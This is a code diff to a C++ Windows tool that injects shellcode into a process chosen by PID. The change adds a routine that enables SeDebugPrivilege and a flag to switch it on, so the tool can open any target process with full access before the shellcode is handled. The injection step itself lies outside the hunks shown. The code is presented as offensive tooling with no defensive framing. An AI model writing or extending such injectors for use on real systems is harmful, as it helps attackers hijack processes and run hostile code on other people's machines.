@@ -1,12 +1,44 @@
 #include "injec.hpp"
-#include <windows.h>
 #include "WsaCleanup.hpp"
 
 static unsigned int pid;
 static bool Verbose;
+static bool NeedDebugPrivilege;
 
 namespace injec
 {
+    bool SetDebugPrivilege(bool enable)
+    {
+        HANDLE hToken;
+        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+        {
+            return false;
+        }
+
+        LUID luid;
+        if (!LookupPrivilegeValueA(nullptr, SE_DEBUG_NAME, &luid))
+        {
+            CloseHandle(hToken);
+            return false;
+        }
+
+        TOKEN_PRIVILEGES tp;
+        tp.PrivilegeCount = 1;
+        tp.Privileges[0].Luid = luid;
+        tp.Privileges[0].Attributes = enable ? SE_PRIVILEGE_ENABLED : 0;
+
+        if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr))
+        {
+            CloseHandle(hToken);
+            return false;
+        }
+
+        bool result = (GetLastError() == ERROR_SUCCESS);
+
+        CloseHandle(hToken);
+        return result;
+    }
+
     static int wsaClear()
     {
         auto* start = reinterpret_cast<UINT8*>(shellcode::shellcode);
@@ -27,10 +59,22 @@ namespace injec
             std::cout << std::dec << std::endl;
         }
 
+        if (NeedDebugPrivilege)
+        {
+            if (!SetDebugPrivilege(true))
+            {
+                if (Verbose)
+                    std::cerr << "Failed to enable SeDebugPrivilege. Make sure you run as Administrator." << std::endl;
+            }
+            else if (Verbose)
+                std::cout << "SeDebugPrivilege enabled successfully." << std::endl;
+        }
+
+
         auto hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
         if (!hProcess)
         {
-            throw std::runtime_error("pid not valid or not access");
+            throw std::runtime_error("pid not valid or no access (even with SeDebugPrivilege)");
         }
 
 
@@ -95,6 +139,7 @@ namespace injec
     int injec(const argparse::ArgumentParser& Program)
     {
         pid = Program.get<unsigned int>("--pid");
+        NeedDebugPrivilege = Program.get<bool>("-dp");
         Verbose = Program.get<bool>("--verbose");
 
         if (Program.get<bool>("-wc"))
